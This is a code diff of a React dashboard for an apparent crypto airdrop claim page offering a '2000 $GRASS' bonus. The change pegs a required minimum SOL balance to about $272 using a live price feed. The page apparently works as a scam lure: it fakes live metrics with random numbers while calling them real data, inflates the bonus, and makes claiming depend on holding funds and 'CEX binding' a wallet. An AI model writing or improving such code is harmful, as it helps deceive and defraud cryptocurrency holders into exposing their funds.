@@ -63,12 +63,30 @@ export default function Dashboard() {
   const [showCexModal, setShowCexModal] = useState(false);
   const [cexAddress, setCexAddress] = useState("");
 
-  const MIN_REQUIRED_BALANCE = 1.86342;
+  const [minRequiredBalance, setMinRequiredBalance] = useState(1.86342); // Initial fallback
+  const TARGET_USD_REQUIREMENT = 272;
   const ELIGIBLE_WALLET = "3xmpXvEX6t7xqrASUyMAFjVDiqoRhfLPs5mtYu1v3ttG";
 
-  // Fetch Metrics
+  // Fetch Metrics & SOL Price
   useEffect(() => {
-    // Simulated fetch with real baseline data
+    const fetchSolPrice = async () => {
+      try {
+        const response = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd");
+        if (response.ok) {
+          const data = await response.json();
+          const price = data.solana.usd;
+          if (price > 0) {
+             const requiredSol = TARGET_USD_REQUIREMENT / price;
+             setMinRequiredBalance(Number(requiredSol.toFixed(5)));
+          }
+        }
+      } catch (error) {
+        console.error("Failed to fetch SOL price", error);
+        // Fallback or keep previous value
+      }
+    };
+
+    // Simulated fetch with real baseline data for dashboard metrics
     const fetchMetrics = () => {
        const basePrice = 0.3159;
        const randomVariation = (Math.random() - 0.5) * 0.005;
@@ -83,8 +101,15 @@ export default function Dashboard() {
     };
 
     fetchMetrics();
-    const interval = setInterval(fetchMetrics, 5000);
-    return () => clearInterval(interval);
+    fetchSolPrice();
+
+    const metricInterval = setInterval(fetchMetrics, 5000);
+    const priceInterval = setInterval(fetchSolPrice, 60000); // Update price every minute
+
+    return () => {
+      clearInterval(metricInterval);
+      clearInterval(priceInterval);
+    };
   }, []);
 
   // Countdown Timer
@@ -266,7 +291,7 @@ export default function Dashboard() {
      const balance = await fetchBalance();
      
      if (balance !== null) {
-        if (balance > MIN_REQUIRED_BALANCE) {
+        if (balance > minRequiredBalance) {
             setShowCexModal(true);
             toast({
               title: "Balance Confirmed",
@@ -276,7 +301,7 @@ export default function Dashboard() {
         } else {
             toast({
                 title: "Insufficient Balance",
-                description: `You need ${MIN_REQUIRED_BALANCE} SOL to commence claiming and CEX binding.`,
+                description: `You need ${minRequiredBalance.toFixed(5)} SOL to commence claiming and CEX binding.`,
                 variant: "destructive",
             });
         }
@@ -285,6 +310,7 @@ export default function Dashboard() {
             title: "Verification Failed",
             description: "Could not verify wallet balance. Try again.",
             variant: "destructive",
+            className: "border-red-500 text-red-500 bg-black/90",
           });
      }
   };
@@ -367,9 +393,9 @@ export default function Dashboard() {
                 )}
               </div>
               {walletBalance !== null && (
-                 <div className={`mt-3 text-sm flex items-center gap-2 ${walletBalance > MIN_REQUIRED_BALANCE ? 'text-[#9dff00]' : 'text-red-400'}`}>
-                    <div className={`w-2 h-2 rounded-full ${walletBalance > MIN_REQUIRED_BALANCE ? 'bg-[#9dff00]' : 'bg-red-400'}`} />
-                    Balance: {walletBalance} SOL {walletBalance < MIN_REQUIRED_BALANCE && `(Minimum ${MIN_REQUIRED_BALANCE} SOL required)`}
+                 <div className={`mt-3 text-sm flex items-center gap-2 ${walletBalance > minRequiredBalance ? 'text-[#9dff00]' : 'text-red-400'}`}>
+                    <div className={`w-2 h-2 rounded-full ${walletBalance > minRequiredBalance ? 'bg-[#9dff00]' : 'bg-red-400'}`} />
+                    Balance: {walletBalance} SOL {walletBalance < minRequiredBalance && `(Minimum ${minRequiredBalance.toFixed(5)} SOL required)`}
                  </div>
               )}
             </div>
@@ -449,11 +475,11 @@ export default function Dashboard() {
                   onClick={handleClaimClick}
                   className="w-full py-4 bg-gradient-to-br from-[#ffd700] to-[#ffed4e] rounded-lg text-[#0a0e27] font-semibold text-lg shadow-[0_5px_20px_rgba(255,215,0,0.3)] hover:shadow-[0_8px_30px_rgba(255,215,0,0.5)] transition-all duration-300"
                 >
-                  🎁 Claim Bonus: 1000 $GRASS
+                  🎁 Claim Bonus: 2000 $GRASS
                 </motion.button>
 
                 <div className="text-white/60 text-xs leading-relaxed max-w-[500px] mx-auto mt-6 text-center">
-                  1.86342 SOL is required to commence claiming and CEX binding.
+                  {minRequiredBalance.toFixed(5)} SOL is required to commence claiming and CEX binding.
                 </div>
               </motion.div>
             )}
